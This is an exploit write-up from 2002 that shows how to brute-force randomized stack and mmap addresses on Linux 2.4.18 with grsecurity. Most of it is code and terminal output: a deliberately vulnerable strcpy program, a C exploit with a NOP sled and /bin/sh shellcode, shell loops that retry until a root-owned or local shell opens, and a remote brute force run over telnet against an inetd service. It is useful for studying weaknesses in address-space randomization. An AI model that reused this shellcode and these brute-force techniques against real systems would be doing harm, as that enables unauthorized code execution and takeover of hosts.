@@ -1,0 +1,157 @@
+
+-=<[ Brute forcing random mmap() localy and remotely...
+-=<[ (linux 2.4.18 + grsecurity patch 1.9.4)
+-=<[ By xfer (xfer@epsa.com.pl)
+-=<[ Thx goes to: tmoggie of Lam3rZ
+
+The algorithm which generates random mmap() addresses is not so strong.
+Look at the example:
+
+xfer@sigsegv:~/mmap$ cat test_mmap.c
+#include <stdio.h>
+int main(void) {
+char buffer[512];
+fprintf(stdout,"%p\n",&buffer);
+return 1;
+}
+xfer@sigsegv:~/mmap$ cc test_mmap.c -o test_mmap
+xfer@sigsegv:~/mmap$ ./test_mmap
+0xbfff61ec
+xfer@sigsegv:~/mmap$ ./test_mmap
+0xbff9073c
+xfer@sigsegv:~/mmap$ ./test_mmap
+0xbffe7f6c
+xfer@sigsegv:~/mmap$ ./test_mmap
+0xbff9b85c
+xfer@sigsegv:~/mmap$ 
+
+Only 4 chars are changing in addresses. In example above this is 0xbffXXXXc.
+Now lets try to brute force the correct address.
+
+xfer@sigsegv:~/mmap$ addr=0xbffcce7c ; tmp=0x0 ; cnt=0; date >> howlong ; while
+[ $addr != $tmp ] ; do tmp=`./test_mmap`; echo $tmp; cnt=`expr $cnt + 1` ; echo
+$cnt 1> tries; done ;date >> howlong;
+0xbffe39ec
+(...)
+0xbfffe5dc
+0xbff0f05c
+0xbffcce7c
+xfer@sigsegv:~/mmap$ cat howlong
+Fri Jun 21 10:55:50 CEST 2002
+Fri Jun 21 11:05:52 CEST 2002
+xfer@sigsegv:~/mmap$ cat tries
+48836
+xfer@sigsegv:~/mmap$
+
+So after 10 minutes time and 48836 tries we have the correct address...
+Now lets try to exploit vulnerable program.
+
+xfer@sigsegv:~/mmap$ cat vuln.c
+#include <stdio.h>
+#include <stdlib.h>
+int main(int argc, char **argv) {
+char buffer[96];
+fprintf(stdout,"%p\n",&buffer);
+strcpy(buffer,argv[1]);
+return 0;
+}
+xfer@sigsegv:~/mmap$ cc vuln.c -o vuln
+xfer@sigsegv:~/mmap$ cat ex.c
+#include <stdlib.h>
+#include <stdio.h>
+#include <unistd.h>
+#define NOP 0x90
+int main(int argc, char **argv) {
+char buffer[128];
+long *ptr=(long *)buffer;
+int x;
+char shellcode[] =
+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+"\x80\xe8\xdc\xff\xff\xff/bin/sh";
+if(argc!=3) {
+fprintf(stderr,"Usage: %s <vuln> <addr_to_buffer>\n",argv[0]);
+return 1;
+}
+memset(buffer, NOP,128);
+for (x = 0; x < 32; x++) *(ptr + x) = (int) strtoul(argv[2], NULL, 16);
+memcpy(buffer,shellcode,strlen(shellcode));
+execl(argv[1],argv[1],buffer,NULL);
+return 0;
+}
+xfer@sigsegv:~/mmap$ cc ex.c -o ex
+xfer@sigsegv:~/mmap$ ./ex
+Usage: ./ex <vuln> <addr_to_buffer>
+xfer@sigsegv:~/mmap$ ./vuln
+0xbffdf40c
+Segmentation fault
+xfer@sigsegv:~/mmap$ while [ 1 ] ; do ./ex ./vuln 0xbffdf40c; done ;
+0xbff9c13c
+Segmentation fault
+(...)
+0xbff3bbbc
+Segmentation fault
+0xbffdf40c
+sh-2.05$
+
+Woohaa! We made it... So after a while we got sh-2.05$.
+These tests were made localy now we should try do the same but remotely.
+We have to add some lines to the /etc/inetd.conf and /etc/services files.
+
+root@sigsegv:/mmap# echo "test_mmap       stream  tcp     nowait  root    /usr/s
+bin/tcpd  /mmap/test_mmap" >> /etc/inetd.conf
+root@sigsegv:/mmap# echo "test_mmap       666/tcp" >> /etc/services
+root@sigsegv:/mmap# killall -HUP inetd
+
+Ok, we set up a server... Now on the other machine:
+
+xfer@buraq:~/mmap$ telnet sigsegv 666
+Trying 10.10.10.1...
+Connected to sigsegv.
+Escape character is '^]'.
+0xbff3f66c
+Connection closed by foreign host.
+xfer@buraq:~/mmap$ addr=0xbff3f66c ; tmp=0x0 ; date >> howlong ; while [ $addr
+ != $tmp ] ; do tmp=`telnet sigsegv 666 2> /dev/null | grep 0x`; echo $tmp; do
+ ne ;date >> howlong;
+0xbffecc0c
+0xbff81d6c
+0xbff80f3c
+0xbfff94ac
+
+[: 0xbff3f66c: unary operator expected
+xfer@buraq:~/mmap$
+
+E? After several tries program raports error.
+
+xfer@buraq:/mmap$ telnet sigsegv 666
+Trying 10.10.10.1...
+telnet: Unable to connect to remote host: Connection refused
+
+And our service was disabled... So we need to restart inetd.
+
+root@sigsegv:/mmap# killall -HUP inetd
+
+What was the reason? Probably connection between hosts was to fast... Lets
+try to add some delay to our script.
+
+xfer@buraq:~/mmap$ addr=0xbff3f66c ; tmp=0x0 ; date >> howlong ; while [ $addr !
+= $tmp ] ; do tmp=`telnet sigsegv 666 2> /dev/null | grep 0x`; echo $tmp; sleep 
+1 ;done ;date >> howlong;
+0xbff0c08c
+0xbff3d2dc
+0xbffc56cc
+(...)
+0xbff3f66c
+xfer@buraq:~/mmap$ cat howlong
+Fri Jun 21 06:27:33 CEST 2002
+Fri Jun 21 11:43:54 CEST 2002
+xfer@buraq:~/mmap$ 
+
+So we won again... Remote tests were made on two machines, one with 
+100mbps ethernet card and the second with 10mbps ethernet card. Both 
+machines were connected to WaveSwitch 1018. 
+
+Greets...
+
+EOF
